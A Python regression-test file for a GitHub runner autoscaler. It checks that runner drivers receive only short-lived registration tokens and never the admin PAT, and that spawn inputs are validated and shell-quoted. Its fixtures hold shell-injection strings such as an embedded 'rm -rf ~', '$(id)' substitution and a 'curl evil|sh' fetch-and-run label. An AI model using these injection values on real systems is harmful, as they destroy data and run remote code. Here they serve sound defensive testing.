"""
Regression tests: runners never receive the admin PAT, and spawn inputs cannot inject shell.

The autoscaler's ACCESS_TOKEN is a repo/org-admin PAT. Every driver must exchange it for a
short-lived registration token on the host and hand only that to the runner; the Host VM
Bridge must never carry the PAT at all. Separately, repo/org/labels/extra_env flow into
container names, labels and VM bootstrap scripts, so they are validated and shell-quoted.
"""

import os
import re
import subprocess
import unittest
from typing import Any
from unittest.mock import MagicMock, patch

import github_api
from drivers import RunnerDriver, validate_spawn_target
from drivers.bridge_driver import BridgeVMDriver
from drivers.docker_driver import DockerDriver
from drivers.multipass_driver import MultipassDriver
from drivers.orbstack_templates import registration_and_run_snippet
from drivers.orbstack_vm_driver import OrbStackVMDriver
from drivers.wsl_driver import WSL2Driver

PAT = "ghp_THIS_IS_THE_ADMIN_PAT"
REG = "REGISTRATION-TOKEN-123"
REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))


class TestCreateRegistrationToken(unittest.TestCase):
    @patch("github_api.github_request", return_value={"token": REG, "expires_at": "x"})
    def test_repo_scope(self, req):
        self.assertEqual(github_api.create_registration_token("o/r", None, PAT), REG)
        req.assert_called_once_with("/repos/o/r/actions/runners/registration-token", access_token=PAT, method="POST")

    @patch("github_api.github_request", return_value={"token": REG})
    def test_org_scope(self, req):
        self.assertEqual(github_api.create_registration_token(None, "acme", PAT), REG)
        req.assert_called_once_with("/orgs/acme/actions/runners/registration-token", access_token=PAT, method="POST")

    @patch("github_api.github_request")
    def test_missing_inputs_make_no_request(self, req):
        self.assertIsNone(github_api.create_registration_token("o/r", None, None))
        self.assertIsNone(github_api.create_registration_token(None, None, PAT))
        req.assert_not_called()

    def test_bad_responses_are_none(self):
        responses: tuple[Any, ...] = (None, True, [], {}, {"token": ""}, {"token": 5})
        for response in responses:
            with self.subTest(response=response), patch("github_api.github_request", return_value=response):
                self.assertIsNone(github_api.create_registration_token("o/r", None, PAT))


class TestValidateSpawnTarget(unittest.TestCase):
    def test_valid(self):
        validate_spawn_target("el-j/run-zero", None, None)
        validate_spawn_target("o/r.name_1", None, "self-hosted,local,x64,my label,gpu:2")
        validate_spawn_target(None, "acme-inc", "vm")
        validate_spawn_target("o/r", None, None, {"FOO": "bar", "_X1": ""})

    def test_invalid(self):
        cases = [
            ('o/r"; rm -rf ~; "', None, None, None),
            ("o/$(id)", None, None, None),
            ("no-slash", None, None, None),
            ("-bad/r", None, None, None),
            (None, "acme;id", None, None),
            (None, None, None, None),
            ("o/r", None, "a,$(id)", None),
            ("o/r", None, "a,,b", None),
            ("o/r", None, 'x"y', None),
            ("o/r", None, None, {"ACCESS_TOKEN": "x"}),
            ("o/r", None, None, {"runner_token": "x"}),
            ("o/r", None, None, {"BAD-KEY": "x"}),
            ("o/r", None, None, {"K": 1}),
            ("o/r", None, None, {"K": "a\x00b"}),
            ("o/r", None, None, ["K=V"]),
            (["o/r"], None, None, None),
        ]
        for repo, org, labels, extra_env in cases:
            with self.subTest(repo=repo, org=org, labels=labels, extra_env=extra_env), self.assertRaises(ValueError):
                validate_spawn_target(repo, org, labels, extra_env)  # type: ignore[arg-type]


class _Probe(RunnerDriver):
    """Minimal concrete driver exposing _prepare_spawn()."""

    def name(self) -> str:
        return "probe"

    def is_available(self) -> bool:
        return True

    def spawn_runner(self, **kwargs: Any) -> str | None:  # type: ignore[override]
        return None

    def list_runners(self):
        return []

    def prune_exited(self, runners):
        return None

    def destroy_runner(self, runner_id: str) -> bool:
        return True

    def cleanup_all(self) -> None:
        return None


class TestPrepareSpawn(unittest.TestCase):
    @patch("drivers.create_registration_token")
    def test_supplied_runner_token_skips_exchange(self, exchange):
        self.assertEqual(_Probe()._prepare_spawn("o/r", None, None, PAT, REG), REG)
        exchange.assert_not_called()

    @patch("drivers.create_registration_token", return_value=REG)
    def test_exchanges_pat(self, exchange):
        self.assertEqual(_Probe()._prepare_spawn("o/r", None, None, PAT, None), REG)
        exchange.assert_called_once_with("o/r", None, PAT)

    @patch("drivers.create_registration_token", return_value=None)
    def test_exchange_failure_is_none(self, _exchange):
        with patch("sys.stderr"):
            self.assertIsNone(_Probe()._prepare_spawn("o/r", None, None, PAT, None))

    @patch("drivers.create_registration_token", return_value=REG)
    def test_invalid_input_is_refused_before_any_exchange(self, exchange):
        with patch("sys.stderr"):
            self.assertIsNone(_Probe()._prepare_spawn("o/$(id)", None, None, PAT, None))
        exchange.assert_not_called()


class _DriverCase(unittest.TestCase):
    def setUp(self):
        reg = patch("drivers.create_registration_token", return_value=REG)
        self.exchange = reg.start()
        self.addCleanup(reg.stop)


class TestDockerNeverReceivesPat(_DriverCase):
    def setUp(self):
        super().setUp()
        self.driver = DockerDriver()
        for name in ("ensure_runtime_assets", "_warn_if_registry_mirror_missing"):
            p = patch.object(self.driver, name, return_value=True)
            p.start()
            self.addCleanup(p.stop)

    @patch("subprocess.run")
    def test_only_registration_token_is_passed(self, run):
        self.assertIsNotNone(self.driver.spawn_runner(repo="o/r", arch="arm64", access_token=PAT))
        cmd = run.call_args.args[0]
        self.assertNotIn(PAT, " ".join(cmd))
        self.assertIn(f"RUNNER_TOKEN={REG}", cmd)
        self.assertFalse(any(arg.startswith("ACCESS_TOKEN=") for arg in cmd))

    @patch("subprocess.run")
    def test_hostile_repo_never_reaches_docker(self, run):
        with patch("sys.stderr"):
            self.assertIsNone(self.driver.spawn_runner(repo='o/r" --privileged "', access_token=PAT))
        run.assert_not_called()

    @patch("subprocess.run")
    def test_extra_env_cannot_override_the_token(self, run):
        with patch("sys.stderr"):
            self.assertIsNone(self.driver.spawn_runner(repo="o/r", access_token=PAT, extra_env={"RUNNER_TOKEN": "evil"}))
        run.assert_not_called()


class TestOrbStackNeverReceivesPat(_DriverCase):
    @patch("subprocess.Popen")
    @patch("subprocess.run")
    def test_setup_script_has_registration_token_only(self, run, popen):
        driver = OrbStackVMDriver(distro="ubuntu:24.04")
        with patch.object(driver, "ensure_runtime_assets", return_value=True):
            self.assertIsNotNone(driver.spawn_runner(repo="o/r", arch="arm64", access_token=PAT))
        script = popen.call_args.args[0][-1]
        self.assertNotIn(PAT, script)
        self.assertIn(REG, script)
        self.assertNotIn("registration-token", script)

    @patch("subprocess.Popen")
    @patch("subprocess.run")
    def test_hostile_labels_refused(self, run, popen):
        driver = OrbStackVMDriver(distro="ubuntu:24.04")
        with patch.object(driver, "ensure_runtime_assets", return_value=True), patch("sys.stderr"):
            self.assertIsNone(driver.spawn_runner(repo="o/r", labels='x"; curl evil|sh; "', access_token=PAT))
        popen.assert_not_called()

    def test_snippet_quotes_every_value(self):
        # Even if a hostile value got past validation, it must stay one shell word.
        snippet = registration_and_run_snippet("https://github.com/o/r", "t$(id)", "vm`id`", "a;b", "")
        self.assertIn("--token 't$(id)'", snippet)
        self.assertIn("--name 'vm`id`'", snippet)
        self.assertIn("--labels 'a;b'", snippet)


class TestWslAndMultipassNeverReceivePat(_DriverCase):
    @patch("subprocess.Popen")
    def test_wsl_script(self, popen):
        self.assertIsNotNone(WSL2Driver().spawn_runner(repo="o/r", access_token=PAT))
        script = popen.call_args.args[0][-1]
        self.assertNotIn(PAT, script)
        self.assertNotIn("ACCESS_TOKEN", script)
        self.assertRegex(script, r"\./config\.sh .*--token " + re.escape(REG))

    @patch("subprocess.Popen")
    @patch("subprocess.run")
    def test_multipass_script(self, run, popen):
        self.assertIsNotNone(MultipassDriver().spawn_runner(repo="o/r", access_token=PAT))
        script = popen.call_args.args[0][-1]
        self.assertNotIn(PAT, script)
        self.assertNotIn("ACCESS_TOKEN", script)
        self.assertRegex(script, r"\./config\.sh .*--token " + re.escape(REG))

    @patch("subprocess.Popen")
    @patch("subprocess.run")
    def test_hostile_inputs_refused(self, run, popen):
        with patch("sys.stderr"):
            self.assertIsNone(WSL2Driver().spawn_runner(repo="o/$(id)", access_token=PAT))
            self.assertIsNone(MultipassDriver().spawn_runner(org="a;b", access_token=PAT))
        popen.assert_not_called()
        run.assert_not_called()


class TestBridgeNeverCarriesPat(_DriverCase):
    def test_client_sends_registration_token_not_pat(self):
        driver = BridgeVMDriver("orbstack-vm", bridge_url="http://bridge")
        with patch.object(driver, "_request", return_value={"status": "success", "runner_id": "vm-1"}) as request:
            self.assertEqual(driver.spawn_runner(repo="o/r", access_token=PAT), "vm-1")
        payload = request.call_args.kwargs["data"]
        self.assertNotIn(PAT, repr(payload))
        self.assertNotIn("access_token", payload)
        self.assertEqual(payload["runner_token"], REG)

    def test_client_refuses_hostile_input_without_calling_bridge(self):
        driver = BridgeVMDriver("orbstack-vm", bridge_url="http://bridge")
        with patch.object(driver, "_request") as request, patch("sys.stderr"):
            self.assertIsNone(driver.spawn_runner(repo="o/$(id)", access_token=PAT))
        request.assert_not_called()


class TestStartShScrubsCredentials(unittest.TestCase):
    """Runs start.sh's own scrub lines in bash and checks what a child process inherits."""

    def _scrub_lines(self) -> str:
        with open(os.path.join(REPO_ROOT, "docker", "start.sh"), encoding="utf-8") as fh:
            text = fh.read()
        lines = [ln for ln in text.splitlines() if ln.startswith(("export -n ACCESS_TOKEN", "unset TOKEN"))]
        self.assertEqual(len(lines), 2, "credential scrub lines missing from docker/start.sh")
        run_idx = text.index("./run.sh &")
        self.assertLess(text.index(lines[0]), run_idx)
        return "\n".join(lines)

    def test_child_processes_inherit_no_credentials(self):
        script = self._scrub_lines() + '\necho "still-in-shell=${ACCESS_TOKEN}"\nenv\n'
        env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "ACCESS_TOKEN": PAT, "RUNNER_TOKEN": REG, "GITHUB_TOKEN": "g", "TOKEN": "t"}
        out = subprocess.run(["bash", "-c", script], env=env, capture_output=True, text=True, check=True).stdout
        self.assertIn(f"still-in-shell={PAT}", out)  # cleanup() can still use it
        child_env = out.split("\n", 1)[1]
        for secret in (PAT, REG, "GITHUB_TOKEN=", "TOKEN=t"):
            self.assertNotIn(secret, child_env)


class TestBridgeServerBoundary(unittest.TestCase):
    """The bridge validates spawn input and never forwards a body-supplied PAT."""

    def setUp(self):
        import vm_bridge

        vm_bridge._driver_cache.clear()
        self.addCleanup(vm_bridge._driver_cache.clear)
        self.driver = MagicMock()
        self.driver.spawn_runner.return_value = "vm-1"
        p = patch("vm_bridge.get_driver", return_value=self.driver)
        p.start()
        self.addCleanup(p.stop)
        self.server = vm_bridge.VMBridgeServer(host="127.0.0.1", port=0)
        with patch("sys.stderr"):
            self.server.start(blocking=False)
        self.addCleanup(self.server.stop)
        assert self.server.httpd is not None
        self.url = f"http://127.0.0.1:{self.server.httpd.server_port}/api/drivers/orbstack-vm/spawn"

    def _post(self, body: bytes) -> int:
        import urllib.error
        import urllib.request

        req = urllib.request.Request(self.url, data=body, headers={"Content-Type": "application/json"}, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status
        except urllib.error.HTTPError as err:
            return err.code

    def test_hostile_repo_is_400(self):
        self.assertEqual(self._post(b'{"repo": "o/$(id)"}'), 400)
        self.driver.spawn_runner.assert_not_called()

    def test_body_access_token_is_not_forwarded(self):
        self.assertEqual(self._post(b'{"repo": "o/r", "access_token": "ghp_x"}'), 200)
        kwargs = self.driver.spawn_runner.call_args.kwargs
        self.assertNotIn("access_token", kwargs)
        self.assertNotIn("ghp_x", repr(kwargs))


if __name__ == "__main__":
    unittest.main()
